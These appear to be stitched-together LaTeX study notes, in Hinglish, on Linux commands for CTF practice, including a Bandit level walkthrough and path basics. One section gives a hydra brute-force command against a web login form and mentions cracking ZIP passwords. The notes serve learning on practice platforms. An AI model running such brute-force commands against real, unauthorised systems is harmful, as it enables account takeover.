\subsection*{\textcolor{important}{Note:}}
\begin{itemize}
    \item \texttt{.tar.gz} = \texttt{-z} (gzip), \texttt{.tar.xz} = \texttt{-J} (xz compression).  
    \item \textbf{CTF Use:} Kabhi-kabhi ZIP files password-protected hote hain. \texttt{fcrackzip} se crack kar sakte ho.  
\end{itemize}

---

\section*{\textcolor{important}{5. \texttt{strace} Command}}
\subsection*{\textcolor{important}{Kya Karta Hai?}}
Kisi program ko run karte waqt \textbf{system calls} aur \textbf{signals} ko trace karta hai. Binary analysis aur debugging mein helpful.  

\subsection*{\textcolor{important}{Examples aur Use Cases:}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Simple Trace:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
strace ./binary  # Binary ke saare system calls dikhayega
    \end{lstlisting}  
    - Output mein \texttt{open}, \texttt{read}, \texttt{write} jaise functions dikhenge.  

    \item \textcolor{important}{\textbf{Specific System Calls Filter Karna (\texttt{-e trace=}):}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
strace -e trace=open,read ./binary  # Sirf "open" aur "read" calls dikhayega
    \end{lstlisting}  

    \item \textcolor{important}{\textbf{CTF Example:}}  
    - Binary file \texttt{/etc/passwd} read kar raha ho, toh flag mil sakta hai:  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
strace ./binary 2>&1 | grep "/etc/passwd"  # File access check karo
    \end{lstlisting}  
    - Agar binary crash ho raha ho, \texttt{strace} se error ka reason pata chalega.  
\end{itemize}

---

\section*{\textcolor{important}{6. More Mostly Used Commands for CTF:}}

\subsection*{\textcolor{important}{\textbf{C. \texttt{wget}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Websites/files ko download karta hai.  
    \item \textcolor{important}{\textbf{Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
wget -r http://ctf.com  # Poori website recursively download karega
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{\textbf{E. \texttt{python3 -m http.server}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Current directory ko local web server banata hai (port 8000).  
    \item \textcolor{important}{\textbf{CTF Use:}} Remote server par file upload karne ke baad download karne ke liye.  
\end{itemize}

\subsection*{\textcolor{important}{\textbf{F. \texttt{diff}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Do files ke beech ka difference batata hai.  
    \item \textcolor{important}{\textbf{Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
diff file1.txt file2.txt  # Dono files mein differences dikhayega
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{\textbf{G. \texttt{scp}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Secure copy (SSH ke through files transfer).  
    \item \textcolor{important}{\textbf{Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
scp user@ctf.com:/remote/path/file.txt .  # Remote server se file download
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{\textbf{H. \texttt{exiftool}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Image/File ke metadata ko read karta hai.  
    \item \textcolor{important}{\textbf{Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
exiftool photo.jpg  # GPS coordinates, camera model, etc. dikhayega
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{\textbf{I. \texttt{hydra}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Brute-force attacks (SSH, FTP, HTTP logins) ke liye.  
    \item \textcolor{important}{\textbf{Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
hydra -l admin -P rockyou.txt ctf.com http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{\textbf{J. \texttt{openssl}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kya Karta Hai?}} Encryption/Decryption, SSL certificates analyze karna.  
    \item \textcolor{important}{\textbf{Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
openssl s_client -connect ctf.com:443  # SSL/TLS connection debug karna
    \end{lstlisting}  
\end{itemize}

---

\section*{\textcolor{important}{Pro Tips for CTF:}}
\begin{itemize}
    \item \textcolor{important}{\textbf{\texttt{| grep "keyword"}}:} Output filter karne ke liye har command ke saath use karo.  
    \item \textcolor{important}{\textbf{\texttt{2>\&1}}:} Error messages ko bhi terminal par dikhane ke liye (e.g., \texttt{strace ./binary 2>\&1 | grep "error"}).  
    \item \textcolor{important}{\textbf{Practice:}} Tryhackme.com ya OverTheWire.org par in commands ko practice karo.  
\end{itemize}


% Background color define karna code blocks ke liye
\definecolor{lightgray}{rgb}{0.95, 0.95, 0.95}
\definecolor{darkgray}{rgb}{0.4, 0.4, 0.4}
\definecolor{black}{rgb}{0, 0, 0}

% Listings (code block) ko configure karna
\lstset{
    backgroundcolor=\color{lightgray},
    basicstyle=\ttfamily\footnotesize,
    frame=single,
    rulecolor=\color{darkgray},
    breaklines=true,
    keywordstyle=\color{blue},
    commentstyle=\color{green!50!black},
    stringstyle=\color{red},
    showstringspaces=false
}

\begin{document}

% Heading: Command ka Explanation
\section*{\textcolor{red}{1. \texttt{xdg-open} Command Linux Mein Kaise Kaam Karta Hai?}}

\vspace{5pt} % Thoda space add kiya readability ke liye

\noindent
\textbf{Introduction:}  
\texttt{xdg-open} ek Linux utility hai jo kisi bhi file ya URL ko **default application** se open karta hai.  
Yeh **XDG (freedesktop.org) standard** ka part hai aur yeh determine karta hai ki kaunsi application use hogi:

\begin{itemize}
    \item File ka \textbf{MIME type} dekhkar.
    \item URL ka \textbf{scheme} dekhkar (http, https, ftp, etc.).
\end{itemize}

\vspace{10pt} % Section ke beech thoda space diya readability ke liye

% Examples Section
\noindent
\textbf{Examples:}  

\vspace{5pt} % Thoda aur spacing improve karna

% Example 1: PDF File Open Karna
\noindent
\textbf{1. PDF File Open Karna}  

\noindent Agar aapko ek PDF file ko default PDF viewer se open karna hai, toh yeh command use karein:

\begin{lstlisting}
xdg-open document.pdf
\end{lstlisting}

\vspace{10pt} % Example ke beech gap dena

% Example 2: URL Open Karna
\noindent
\textbf{2. Default Browser Mein URL Open Karna}  

\noindent Agar kisi website ko default browser mein open karna hai, toh yeh command use karein:

\begin{lstlisting}
xdg-open https://example.com
\end{lstlisting}

\vspace{10pt} % Thoda aur spacing improve karna

% Working Explanation
\noindent
\textbf{Kaise Kaam Karta Hai?}  

\noindent Jab yeh command execute hota hai, toh **yeh file ya URL ko is tarah open karta hai jaise aapne usko manually double-click kiya ho.**  

\vspace{10pt} % Spacing improve karna

% Important Note
\noindent
\textbf{\textcolor{red}{⚠ Important Note}}  

\begin{itemize}
    \item Agar yeh command kisi **server ya system** pe chalaya jaye jisme **GUI (Graphical User Interface)** nahi hai, toh error aa sakta hai.  
    \item Aise cases mein **virtual display ya headless environment** setup karna zaroori hota hai.
\end{itemize}

\hrule % Line separator for neatness

===============================
\hrule




% Define colors
\definecolor{important}{rgb}{1, 0, 0} % Red for important points
\definecolor{example}{rgb}{0, 0.5, 0} % Green for examples
\definecolor{code}{rgb}{0, 0, 0.8} % Blue for code
\definecolor{lightgray}{rgb}{0.9, 0.9, 0.9} % Light gray for code blocks

\begin{document}



\section*{\textbf{\LARGE \textcolor{violet}{`./*` ka General Use kisi bhi Command ke Saath}}}

\author{}
\date{}
\maketitle

\section*{\textcolor{important}{Haan bhai, general tarike se samjhata hoon}}
Taaki tumhare notes me bhi clearly likh sake.  

\section*{\textcolor{important}{`./*` ka General Use kisi bhi Command ke Saath}}
Agar \textbf{kisi bhi Linux command} ke saath \texttt{\textcolor{code}{./*}} use karte ho, toh iska matlab hota hai:  

\begin{itemize}
    \item \textcolor{important}{\textbf{Current directory (\texttt{\textcolor{code}{.}}) ke andar jitni bhi files aur folders hain, unko uss command ke saath apply karna.}}  
    \item \textcolor{important}{\textbf{\texttt{\textcolor{code}{*}} (wildcard) ka use karke sabhi files/folders ko select karna.}}  
    \item \textcolor{important}{\textbf{Command ko har file/folder pe individually execute karna.}}  
\end{itemize}

\section*{\textcolor{important}{Examples with Different Commands}}

\subsection*{\textcolor{important}{1️⃣ \texttt{\textcolor{code}{ls ./*}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Current directory ke andar sabhi files aur folders ko list karega (ye \texttt{\textcolor{code}{ls *}} ke barabar hi hai).  
    \item \textcolor{important}{\textbf{Example Output:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
./file1.txt  ./image.png  ./script.sh  ./folder1
    \end{lstlisting}
\end{itemize}

\subsection*{\textcolor{important}{2️⃣ \texttt{\textcolor{code}{rm ./*}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Current directory ke andar sabhi files ko \textbf{delete karega}.  
    \item \textcolor{important}{\textbf{⚠️ Dhyan rahe, ye dangerous ho sakta hai!}}  
\end{itemize}

\subsection*{\textcolor{important}{3️⃣ \texttt{\textcolor{code}{cat ./*}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Current directory ki \textbf{sabhi text files ka content print karega}.  
    \item Agar koi \textbf{binary file hui toh error de sakta hai}.  
\end{itemize}

\subsection*{\textcolor{important}{4️⃣ \texttt{\textcolor{code}{chmod +x ./*}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Current directory ki \textbf{sabhi files ko executable banayega} (specially scripts aur programs ke liye useful).  
\end{itemize}

\subsection*{\textcolor{important}{5️⃣ \texttt{\textcolor{code}{mv ./* /destination/path/}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Current directory ki \textbf{sabhi files ko kisi dusre folder me move karega}.  
\end{itemize}

\subsection*{\textcolor{important}{6️⃣ \texttt{\textcolor{code}{cp ./* /backup/}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Sabhi files/folders ko \textbf{backup directory me copy karega}.  
\end{itemize}

\subsection*{\textcolor{important}{7️⃣ \texttt{\textcolor{code}{grep "password" ./*}}}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kaam:}} Sabhi files me \textbf{"password" word ko dhoondega} aur matching lines print karega.  
\end{itemize}

\section*{\textcolor{important}{Conclusion (Notes ke Liye)}}
\begin{itemize}
    \item \texttt{\textcolor{code}{./*}} → Current directory ke \textbf{sabhi files aur folders ko select karta hai}.  
    \item Kisi bhi command ke saath \texttt{\textcolor{code}{./*}} lagane se \textbf{wo command har ek file pe execute hoti hai}.  
    \item \textcolor{important}{\textbf{Caution:}} \texttt{\textcolor{code}{rm ./*}} ya \texttt{\textcolor{code}{mv ./*}} jaise commands dhyan se chalana, warna important files delete/move ho sakti hain!  
\end{itemize}

\section*{\textcolor{important}{CTF aur Hacking me Useful Commands}}
\begin{itemize}
    \item \texttt{\textcolor{code}{file ./*}} → Sabhi files ka type check karne ke liye  
    \item \texttt{\textcolor{code}{strings ./*}} → Sabhi files me readable text dhundhne ke liye  
    \item \texttt{\textcolor{code}{hexdump -C ./*}} → Binary files ka hexadecimal data dekhne ke liye  
    \item \texttt{\textcolor{code}{grep "flag" ./*}} → Flag ya secret keywords find karne ke liye  
\end{itemize}

\section*{\textcolor{important}{Agar koi aur doubt ho toh batao! ��}}

===============================
\hrule




% Define colors
\definecolor{important}{rgb}{1, 0, 0} % Red for important points
\definecolor{example}{rgb}{0, 0.5, 0} % Green for examples
\definecolor{code}{rgb}{0, 0, 0.8} % Blue for code
\definecolor{lightgray}{rgb}{0.9, 0.9, 0.9} % Light gray for code blocks

\begin{document}



\section*{\textbf{\LARGE \textcolor{violet}{important}{Step-by-Step Approach to Solve CTF}}}



\author{}
\date{}
\maketitle

\section*{\protect\textcolor{important}{Samajh gaya!}}
Tumhe ek \textbf{pure step-by-step breakdown} chahiye, jisme bataya jaye ki \textbf{kaise ek command ko samajhna hai} aur \textbf{kyun ek specific argument use kiya gaya hai}. Chalo ab \textbf{ekdum systematically} approach karte hain.  

\section*{\protect\textcolor{important}{Step-by-Step Approach to Solve Bandit Level 5 $\rightarrow$ 6}}

\subsection*{\protect\textcolor{important}{$\bullet$ Step 1: Problem Statement Carefully Read Karo}}
Pehla kaam \textbf{statement ko samajhna hai}:  
\begin{itemize}
    \item \textcolor{important}{\textbf{File `inhere` directory ke andar hai}}  
    \item \textcolor{important}{\textbf{File ka size exactly `1033 bytes` hai}}  
    \item \textcolor{important}{\textbf{File executable nahi hai}}  
    \item \textcolor{important}{\textbf{File human-readable hai}}  
\end{itemize}

\textbf{Matlab:} Hume ek \textbf{specific size ki file} dhundhni hai jo \textbf{executable nahi ho}.  

\subsection*{\protect\textcolor{important}{$\bullet$ Step 2: Pehle Explore Karo - Kya Hai System Mein?}}
Pehle `inhere` folder ke andar \textbf{files ko dekhna} zaroori hai:  

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
ls -l inhere
\end{lstlisting}

\subsubsection*{\protect\textcolor{important}{$\bullet$ Yeh Command Kyun?}}
\begin{itemize}
    \item \texttt{\textcolor{code}{ls}} $\rightarrow$ List files.  
    \item \texttt{\textcolor{code}{-l}} (long listing) $\rightarrow$ File permissions, size, owner, etc. dikhayega.  
\end{itemize}

Agar output bahut bada ho ya hidden files ho to \texttt{\textcolor{code}{ls -la}} bhi try kar sakte hain.

\subsection*{\protect\textcolor{important}{$\bullet$ Step 3: Find Command Identify Karo}}
Ab \textbf{hume ek specific file dhundhni hai}.  

\textbf{Kaunsa command kaam aayega?}  
\begin{itemize}
    \item Files dhundhne ka kaam \texttt{\textcolor{code}{find}} command karta hai.  
    \item Pehle check karo ki \texttt{\textcolor{code}{find}} command ke kya options hai:  
\end{itemize}

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
man find
\end{lstlisting}
Ya  
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
find --help
\end{lstlisting}

\subsection*{\protect\textcolor{important}{$\bullet$ Step 4: Manual Page Read Karo}}
\texttt{\textcolor{code}{man find}} run karne ke baad \textbf{man page open hoga}.  
Ab \textbf{find ke options dhundhne ke liye search karo}:

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
/ -type
\end{lstlisting}
(Press \texttt{\textcolor{code}{/}} key, then type \texttt{\textcolor{code}{-type}}, and press \textbf{Enter})

\subsubsection*{\protect\textcolor{important}{$\bullet$ Yeh Kyun Zaroori Hai?}}
\begin{itemize}
    \item \texttt{\textcolor{code}{/}} se \textbf{man page ke andar search} kar sakte hain.  
    \item \texttt{\textcolor{code}{-type}} ka \textbf{meaning aur possible values} milengi.  
    \item Man page bataayega ki \texttt{\textcolor{code}{-type}} ka \textbf{use kaise hota hai}:
\end{itemize}

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
       -type c
              File is of type c:
              f  regular file
              d  directory
              l  symbolic link
\end{lstlisting}

\textbf{Matlab:}  
\begin{itemize}
    \item \texttt{\textcolor{code}{-type f}} $\rightarrow$ \textbf{Sirf files ke liye}  
    \item \texttt{\textcolor{code}{-type d}} $\rightarrow$ \textbf{Directories ke liye}  
    \item \texttt{\textcolor{code}{-type l}} $\rightarrow$ \textbf{Symbolic links ke liye}  
\end{itemize}

✅ \textbf{Toh hume \texttt{\textcolor{code}{-type f}} use karna hai kyunki hume ek file chahiye.}  

\subsection*{\protect\textcolor{important}{$\bullet$ Step 5: File Size Ka Argument Dhundhna}}
Ab \textbf{hume ek specific size (1033 bytes) ki file chahiye}.  
Wapas \texttt{\textcolor{code}{man find}} me search karo:  

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
/ -size
\end{lstlisting}

Isse ye output milega:

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
       -size n[cwbkMG]
              File uses n units of space. 
              The following suffixes can be used:
              c  bytes
              k  kilobytes
              M  megabytes
\end{lstlisting}

✅ \textbf{Matlab hume \texttt{\textcolor{code}{-size 1033c}} likhna hoga, kyunki \texttt{\textcolor{code}{c}} ka matlab hota hai "bytes".}  

\subsection*{\protect\textcolor{important}{$\bullet$ Step 6: Executable File Ko Exclude Karna}}
Ab \textbf{hume ensure karna hai ki file executable na ho}.  
Iske liye \texttt{\textcolor{code}{find}} me ek aur option hota hai:  

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
/ -executable
\end{lstlisting}

Iska man page me ye output milega:

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
       -executable
              Matches files which are executable.
\end{lstlisting}

But hume \textbf{executable files ko exclude} karna hai, toh \texttt{\textcolor{code}{!}} (NOT) operator use karenge:

✅ \textbf{Matlab: \texttt{\textcolor{code}{! -executable}} likhna padega.}

\subsection*{\protect\textcolor{important}{$\bullet$ Step 7: Full Find Command Banana}}
Ab \textbf{humare paas sab required options hai}, toh command banayenge:

\begin{lstlisting}[backgroundcolor=\color{lightgray}]
find . -type f -size 1033c ! -executable
\end{lstlisting}

✅ \textbf{Command Breakdown:}  
\begin{itemize}
    \item \texttt{\textcolor{code}{find .}} $\rightarrow$ Current directory (\texttt{\textcolor{code}{.}}) se search shuru karo  
    \item \texttt{\textcolor{code}{-type f}} $\rightarrow$ Sirf files dhoondo  
    \item \texttt{\textcolor{code}{-size 1033c}} $\rightarrow$ Jo file \textbf{exactly 1033 bytes ki ho}  
    \item \texttt{\textcolor{code}{! -executable}} $\rightarrow$ Jo \textbf{executable nahi hai}  
\end{itemize}

Ye command \textbf{humari required file ka naam print karega}.  

  

\section*{\protect\textcolor{important}{Summary: Step-by-Step Problem Solving Approach}}
\subsection*{\protect\textcolor{important}{$\bullet$ 1. Problem ko carefully read karo.}}  
\begin{itemize}
    \item \textbf{Kya chahiye?} File name, size, location, readable/executable status.  
    \item \textbf{Kaunse commands use ho sakte hain?} (\texttt{\textcolor{code}{find}}, \texttt{\textcolor{code}{ls}}, \texttt{\textcolor{code}{cat}} etc.)
\end{itemize}

\subsection*{\protect\textcolor{important}{$\bullet$ 2. Manual page ya help command padho.}}  
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
man find
find --help
\end{lstlisting}
\begin{itemize}
    \item \textbf{Search karo (\texttt{\textcolor{code}{/ -type}}, \texttt{\textcolor{code}{/ -size}}, \texttt{\textcolor{code}{/ -executable}})}  
    \item Arguments aur options ko \textbf{line-by-line samjho}.  
\end{itemize}

\subsection*{\protect\textcolor{important}{$\bullet$ 3. Command ko step-by-step build karo.}}  
\begin{itemize}
    \item \textbf{\texttt{\textcolor{code}{find}} se start karo.}  
    \item \textbf{Pehle \texttt{\textcolor{code}{-type f}} lagao} $\rightarrow$ Sirf files ke liye.  
    \item \textbf{Phir \texttt{\textcolor{code}{-size 1033c}} lagao} $\rightarrow$ Jo exactly 1033 bytes ki ho.  
    \item \textbf{Phir \texttt{\textcolor{code}{! -executable}} lagao} $\rightarrow$ Jo executable na ho.  
\end{itemize}

\subsection*{\protect\textcolor{important}{$\bullet$ 4. Test karo aur execute karo.}}  
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
find . -type f -size 1033c ! -executable
\end{lstlisting}
Agar output nahi aata, \textbf{check karo ki file exist karti hai ya nahi (\texttt{\textcolor{code}{ls -l inhere}})}.  

\subsection*{\protect\textcolor{important}{$\bullet$ 5. File ka content read karo.}}  
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cat <filename>
\end{lstlisting}

\subsection*{\protect\textcolor{important}{$\bullet$ 6. Password copy karo aur next level login karo!}}  
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh bandit6@bandit.labs.overthewire.org -p 2220
\end{lstlisting}

\section*{\protect\textcolor{important}{Key Takeaways}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Problem ko breakdown karo aur step-by-step solve karo.}}  
    \item \textcolor{important}{\textbf{Man page se search karna seekho (\texttt{\textcolor{code}{/ keyword}}).}}  
    \item \textcolor{important}{\textbf{Commands ko experiment karke samjho.}}  
    \item \textcolor{important}{\textbf{Jab tak logic clear na ho, blindly command copy-paste mat karo!}}  
\end{itemize}

\section*{\protect\textcolor{important}{Agar koi aur doubt hai ya kisi aur command ko deeply samajhna hai, to batao!}}

===============================
\hrule



% Define colors
\definecolor{important}{rgb}{1, 0, 0} % Red for important points
\definecolor{code}{rgb}{0, 0, 0.8} % Blue for code
\definecolor{lightgray}{rgb}{0.9, 0.9, 0.9} % Light gray for code blocks

\begin{document}



\title{\textbf{\LARGE \textcolor{violet}{Understanding `.` (Dot), `..` (Double Dot), and `/` (Slash) in Linux Commands}}}


\author{}
\date{}
\maketitle

\section*{\protect\textcolor{important}{Introduction: Why Learn This?}}
Bahut badhiya! Chalo **aur short aur simple tarike se samajhte hain** **`.` (dot)** aur **`/` (slash)** ka use **different commands** ke saath.  

---

\section*{\protect\textcolor{important}{�� 1️⃣ `ls` (List Files \& Directories)}}
\subsection*{\textcolor{important}{$\bullet$ Current Directory Ke Files Dekhne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
ls .
\end{lstlisting}
(= Yahi folder ka content dikhega)

\subsection*{\textcolor{important}{$\bullet$ Root Directory Ke Files Dekhne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
ls /
\end{lstlisting}
(= Pura system ka top-level folders dikhega, jaise `bin`, `home`, `etc`...)

\subsection*{\textcolor{important}{$\bullet$ Ek Level Upar Wale Directory Ke Files Dekhne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
ls ..
\end{lstlisting}
(= Parent folder ka content dikhega)

---

\section*{\protect\textcolor{important}{�� 2️⃣ `cd` (Change Directory)}}
\subsection*{\textcolor{important}{$\bullet$ Wahi Pe Rehne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cd .
\end{lstlisting}
(= Koi effect nahi hoga, kyunki tum wahi ho)

\subsection*{\textcolor{important}{$\bullet$ Ek Step Upar Jane Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cd ..
\end{lstlisting}
(= Parent directory me chala jayega)

\subsection*{\textcolor{important}{$\bullet$ Seedha Root Directory Me Jane Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cd /
\end{lstlisting}
(= System ke top-level pe chala jayega)

---

\section*{\protect\textcolor{important}{�� 3️⃣ `find` (Search Files \& Directories)}}
\subsection*{\textcolor{important}{$\bullet$ Current Directory Me Search Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
find . -type f
\end{lstlisting}
(= Sirf yaha ke files dhundho)

\subsection*{\textcolor{important}{$\bullet$ Pura System Scan Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
find / -type f
\end{lstlisting}
(= Root se shuru karke sab files search karega, slow ho sakta hai!)

\subsection*{\textcolor{important}{$\bullet$ Ek Level Upar Wale Folder Me Search Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
find .. -type f
\end{lstlisting}
(= Parent folder ke andar wali files search karega)

---

\section*{\protect\textcolor{important}{�� 4️⃣ `cp` (Copy Files \& Directories)}}
\subsection*{\textcolor{important}{$\bullet$ Current Directory Me Copy Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cp file1.txt ./file2.txt
\end{lstlisting}
(= `file1.txt` ka copy **yahi directory** me `file2.txt` naam se banega)

\subsection*{\textcolor{important}{$\bullet$ Root Directory Me Copy Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cp file1.txt /root/
\end{lstlisting}
(= Agar permission hai, toh file root folder me copy ho jayegi)

\subsection*{\textcolor{important}{$\bullet$ Ek Level Upar Wale Folder Me Copy Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
cp file1.txt ../
\end{lstlisting}
(= Parent folder me file copy ho jayegi)

---

\section*{\protect\textcolor{important}{�� 5️⃣ `mv` (Move/Rename Files)}}
\subsection*{\textcolor{important}{$\bullet$ Current Directory Me Rename Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
mv file1.txt ./file2.txt
\end{lstlisting}
(= **Yahi directory** me `file1.txt` ka naam `file2.txt` ho jayega)

\subsection*{\textcolor{important}{$\bullet$ Root Directory Me Move Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
mv file1.txt /root/
\end{lstlisting}
(= Agar permission hai, toh root directory me chala jayega)

\subsection*{\textcolor{important}{$\bullet$ Ek Level Upar Wale Folder Me Move Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
mv file1.txt ../
\end{lstlisting}
(= Parent directory me file chali jayegi)

---

\section*{\protect\textcolor{important}{�� 6️⃣ `rm` (Delete Files \& Directories)}}
\subsection*{\textcolor{important}{$\bullet$ Current Directory Me File Delete Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
rm ./file1.txt
\end{lstlisting}
(= `file1.txt` **isi folder** se delete hoga)

\subsection*{\textcolor{important}{$\bullet$ Root Directory Me File Delete Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
rm /root/file1.txt
\end{lstlisting}
(= Agar permission hai, toh root directory me file delete ho jayegi)

\subsection*{\textcolor{important}{$\bullet$ Ek Level Upar Wale Folder Me File Delete Karne Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
rm ../file1.txt
\end{lstlisting}
(= Parent folder ke andar se file delete ho jayegi)

---

\section*{\protect\textcolor{important}{�� 7️⃣ `tar` (Compress \& Extract Files)}}
\subsection*{\textcolor{important}{$\bullet$ Current Directory Ka Backup Lene Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
tar -cvf backup.tar .
\end{lstlisting}
(= **Isi directory** ka archive `backup.tar` me banega)

\subsection*{\textcolor{important}{$\bullet$ Root Directory Ka Backup Lene Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
tar -cvf root_backup.tar /
\end{lstlisting}
(= **Poore system** ka archive `root_backup.tar` me banega)

\subsection*{\textcolor{important}{$\bullet$ Ek Level Upar Wale Folder Ka Backup Lene Ke Liye:}}
\begin{lstlisting}[backgroundcolor=\color{lightgray}]
tar -cvf parent_backup.tar ../
\end{lstlisting}
(= Parent folder ka archive `parent_backup.tar` me banega)

---

\section*{\protect\textcolor{important}{�� Final Summary (Shortcut Table)}}
\begin{center}
\begin{tabular}{|l|l|l|l|}
\hline
\textbf{Command} & \textbf{`.` (Current Folder)} & \textbf{`..` (Parent Folder)} & \textbf{`/` (Root Folder)} \\
\hline
\texttt{ls} & \texttt{ls .} (Current folder dekho) & \texttt{ls ..} (Parent folder dekho) & \texttt{ls /} (Root folder dekho) \\
\hline
\texttt{cd} & \texttt{cd .} (Wahi raho) & \texttt{cd ..} (Parent folder jao) & \texttt{cd /} (Root folder jao) \\
\hline
\texttt{find} & \texttt{find . -type f} (Yahi search karo) & \texttt{find .. -type f} (Parent me search) & \texttt{find / -type f} (Pura system search) \\
\hline
\texttt{cp} & \texttt{cp file ./copy} (Yahi copy) & \texttt{cp file ../} (Parent me copy) & \texttt{cp file /root/} (Root me copy) \\
\hline
\texttt{mv} & \texttt{mv file ./newname} (Rename) & \texttt{mv file ../} (Parent me move) & \texttt{mv file /root/} (Root me move) \\
\hline
\texttt{rm} & \texttt{rm ./file} (Yahi se delete) & \texttt{rm ../file} (Parent se delete) & \texttt{rm /root/file} (Root se delete) \\
\hline
\texttt{tar} & \texttt{tar -cvf backup.tar .} & \texttt{tar -cvf backup.tar ../} & \texttt{tar -cvf backup.tar /} \\
\hline
\end{tabular}
\end{center}

---

\section*{\protect\textcolor{important}{�� Conclusion}}
\begin{enumerate}[label=\textcolor{important}{\arabic*.}]
    \item \textbf{`.` (dot) ka matlab} → "Jo directory me ho, wahi"
    \item \textbf{`..` (double dot) ka matlab} → "Parent directory"
    \item \textbf{`/` (slash) ka matlab} → "Root directory"
    \item \textbf{Ye concept `ls`, `cd`, `find`, `cp`, `mv`, `rm`, `tar` sabme apply hota hai!}
\end{enumerate}

Agar ab bhi koi confusion hai, toh batao! 

===============================
\hrule

\section*{\textbf{\LARGE \textcolor{violet}{CTF SOLVING }}}


\definecolor{myblue}{RGB}{0,102,204}      % Blue for headings
\definecolor{mygreen}{RGB}{0,153,76}      % Green for examples
\definecolor{myred}{RGB}{204,0,0}         % Red for emphasis
\definecolor{mylightblue}{RGB}{173,216,230} % Light blue for code blocks
\definecolor{mylightgreen}{RGB}{144,238,144} % Light green for table rows
\definecolor{myorange}{RGB}{255,165,0}    % Orange for subheadings
\definecolor{mypurple}{RGB}{128,0,128}    % Purple for sub-subheadings

\titleformat{\section}{\Large\bfseries\color{myblue}}{\thesection}{1em}{}
\titleformat{\subsection}{\large\bfseries\color{myorange}}{\thesubsection}{1em}{}
\titleformat{\subsubsection}{\normalsize\bfseries\color{mypurple}}{\thesubsubsection}{1em}{}


\lstset{
    backgroundcolor=\color{mylightblue}, % Light blue background
    basicstyle=\ttfamily\footnotesize, % Smaller font size
    frame=single,                   % Framed border
    breaklines=true,                % Allow line breaks
    breakatwhitespace=true,         % Break at whitespace
    breakindent=0pt,                % No indent after break
    keywordstyle=\color{myblue},    % Keywords in blue
    commentstyle=\color{gray},      % Comments in gray
    stringstyle=\color{mypurple},   % Strings in purple
    showspaces=false,               % No space markers
    showstringspaces=false,         % No string space markers
    tabsize=4,                      % Tab size
    xleftmargin=0.5cm,              % Left margin for code
    xrightmargin=0.5cm              % Right margin for code
}

% Define Bash language for listings
\lstdefinelanguage{Bash}{
    morekeywords={nikto,wpscan,hydra,ffuf,hash-identifier,find,hashcat},
